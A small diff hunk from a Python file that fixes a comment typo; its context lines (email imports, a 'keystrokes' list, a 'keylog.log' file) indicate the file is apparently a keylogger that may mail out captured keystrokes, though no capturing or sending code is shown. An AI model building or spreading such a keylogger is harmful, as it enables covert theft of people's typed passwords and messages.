@@ -7,7 +7,7 @@ from email.mime.multipart import MIMEMultipart
 import logging
 import configparser
 
-# Globals variables
+# Global variables
 keystrokes = []
 LOG_FILE = "keylog.log"
 TXT_FILE = ""
